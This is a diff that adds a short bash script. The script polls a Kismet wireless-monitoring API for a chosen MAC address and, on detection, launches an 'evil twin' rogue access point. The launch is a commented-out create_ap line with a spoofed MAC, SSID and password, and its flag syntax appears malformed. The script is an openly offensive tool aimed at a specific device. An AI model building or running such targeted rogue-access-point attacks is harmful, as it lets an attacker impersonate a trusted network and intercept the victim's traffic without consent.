@@ -1,0 +1,29 @@
+#!/bin/bash
+# Monitor Kismet's API for a specific MAC address and initiate an "EVIL TWIN" attack upon detection.
+
+# Define the MAC address to monitor
+target_mac="TARGET:MAC"
+
+while true; do
+    # Use curl to query the Kismet REST API for detected devices
+    kismet_data=$(curl -u kismet:kismet http://0.0.0.0:2501/devices/all_devices.ekjson 2>/dev/null)
+
+    # Check if the curl request was successful
+    if [ $? -ne 0 ]; then
+        echo "Error: Unable to retrieve data from Kismet API."
+        sleep 30  # Wait before the next attempt
+        continue
+    fi
+
+    # Check if the MAC address is detected in Kismet's data
+    if echo "$kismet_data" | grep -q "$target_mac"; then
+        echo "MAC address $target_mac detected. Initiating EVIL TWIN."
+        echo "SUCCESS"
+        # Uncomment the following line when you are sure about the consequences
+        # sudo create_ap -w 2 -c 11 --0a:8b:87:69:18:36 --freq-band 2.4 wlan2 wlan2 "sotf 511.2" password --no-virt
+        exit
+    fi
+
+    # Adjust the sleep interval based on your monitoring needs
+    sleep 30  # Check every 30 seconds
+done
